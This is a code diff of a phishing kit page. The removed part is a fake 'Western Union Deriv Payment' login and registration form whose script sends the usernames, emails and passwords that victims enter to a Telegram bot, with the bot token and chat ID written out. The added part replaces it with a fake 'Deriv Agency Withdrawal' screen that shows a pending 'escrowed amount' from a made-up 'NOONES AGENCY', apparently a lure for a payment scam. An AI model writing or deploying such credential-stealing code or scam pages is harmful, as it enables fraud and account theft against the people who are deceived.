@@ -3,173 +3,168 @@
 
 <head>
     <meta charset="UTF-8">
+    <title>Deriv Agency Withdrawal</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Western Union</title>
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/en/thumb/4/47/Western_Union_Logo.svg/1200px-Western_Union_Logo.svg.png" type="image/png">
+
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
             margin: 0;
-            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #0b0f1a;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #fff;
         }
         
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            width: 90%;
-            max-width: 400px;
+        .card {
+            width: 360px;
+            background: #111827;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
         }
         
-        h1 {
+        .logo {
             text-align: center;
             margin-bottom: 20px;
         }
         
-        .input-group {
-            margin-bottom: 15px;
+        .logo img {
+            width: 120px;
         }
         
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
+        .status {
+            background: #1f2937;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #facc15;
+            font-weight: bold;
         }
         
-        .input-group input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+        .amount {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .amount h1 {
+            margin: 0;
+            font-size: 30px;
+            color: #22c55e;
+        }
+        
+        .amount span {
+            font-size: 14px;
+            color: #9ca3af;
+        }
+        
+        .details {
+            background: #020617;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+        }
+        
+        .details div {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .details div:last-child {
+            margin-bottom: 0;
+        }
+        
+        .label {
+            color: #9ca3af;
+        }
+        
+        .value {
+            font-weight: bold;
         }
         
         .btn {
             width: 100%;
-            padding: 10px;
-            background-color: #ffcc00;
+            padding: 15px;
             border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            border-radius: 10px;
+            background: #16a34a;
+            color: #fff;
+            font-size: 16px;
             font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
         }
         
         .btn:hover {
-            background-color: #e6b800;
+            background: #15803d;
         }
         
-        .footer {
+        .note {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #9ca3af;
             text-align: center;
-            margin-top: 10px;
-        }
-        
-        .footer a {
-            color: #007bff;
-            text-decoration: none;
-        }
-        
-        .footer a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
 
 <body>
-    <div class="container" id="login-form" style="display: block;">
-        <h1>Welcome to Western Union Deriv Payment</h1>
-        <div class="input-group">
-            <label for="login-username">Email or username</label>
-            <input type="text" id="login-username" required>
+
+    <div class="card">
+
+        <div class="logo">
+            <!-- NoOnes logo -->
+            <h2 class="mb-4" style="color: #ff444f; font-weight: bold; font-style: italic;">deriv</h2>
         </div>
-        <div class="input-group">
-            <label for="login-password">Password</label>
-            <input type="password" id="login-password" required>
+
+        <div class="status">
+            Withdrawal Pending
         </div>
-        <button class="btn" onclick="login()">Log in</button>
-        <div class="footer">
-            <a href="#" onclick="showRegister()">Don't have an account? Register</a>
+
+        <div class="amount">
+            <h1>ESCROWED AMOUNT</h1>
+            <span>Pending Amount</span>
         </div>
+
+        <div class="details">
+            <div>
+                <span class="label">Payment Method</span>
+                <span class="value">AS PROVIDED IN ESCROW</span>
+            </div>
+
+            <div>
+                <span class="label">NOONESPAY</span>
+                <span class="value">INSTANT APPROVAL</span>
+            </div>
+
+            <div>
+                <span class="label">SENDER</span>
+                <span class="value">NOONES AGENCY</span>
+            </div>
+
+            <div>
+                <span class="label">Status</span>
+                <span class="value" style="color:#facc15;">Pending</span>
+            </div>
+        </div>
+
+        <button class="btn" onclick="window.location.href='deriv.html'">
+        Withdraw Payment
+    </button>
+        <button class="btn" onclick="window.location.href='deriv.html'">
+        Cancel Transaction Now
+    </button>
+        <div class="note">
+            Processing may take a few minutes depending on network availability.
+        </div>
+
     </div>
 
-    <div class="container" id="register-form" style="display: none;">
-        <h1>Create an Account</h1>
-        <div class="input-group">
-            <label for="register-username">Username</label>
-            <input type="text" id="register-username" required>
-        </div>
-        <div class="input-group">
-            <label for="register-email">Email</label>
-            <input type="email" id="register-email" required>
-        </div>
-        <div class="input-group">
-            <label for="register-password">Password</label>
-            <input type="password" id="register-password" required>
-        </div>
-        <div class="input-group">
-            <label for="register-confirm-password">Confirm Password</label>
-            <input type="password" id="register-confirm-password" required>
-        </div>
-        <button class="btn" onclick="register()">Register</button>
-        <div class="footer">
-            <a href="#" onclick="showLogin()">Already have an account? Log in</a>
-        </div>
-    </div>
-
-    <script>
-        const TELEGRAM_BOT_TOKEN = '8060679781:AAGFBRA2mLcT1KIjfQ1Y_PmvCeCFW-T10-c';
-        const CHAT_ID = '5615316142';
-
-        function showRegister() {
-            document.getElementById('login-form').style.display = 'none';
-            document.getElementById('register-form').style.display = 'block';
-        }
-
-        function showLogin() {
-            document.getElementById('register-form').style.display = 'none';
-            document.getElementById('login-form').style.display = 'block';
-        }
-
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            const params = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            };
-            await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(params)
-            });
-        }
-
-        async function login() {
-            const username = document.getElementById('login-username').value;
-            const password = document.getElementById('login-password').value;
-
-            const message = `Logging in...\nUsername: ${username}\nPassword: ${password}`;
-            await sendToTelegram(message);
-            // Redirect to deriv.html
-            window.location.href = 'deriv.html';
-        }
-
-        async function register() {
-            const username = document.getElementById('register-username').value;
-            const email = document.getElementById('register-email').value;
-            const password = document.getElementById('register-password').value;
-
-            const message = `Registering...\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
-            await sendToTelegram(message);
-            // Redirect to deriv.html
-            window.location.href = 'deriv.html';
-        }
-    </script>
 </body>
 
 </html>
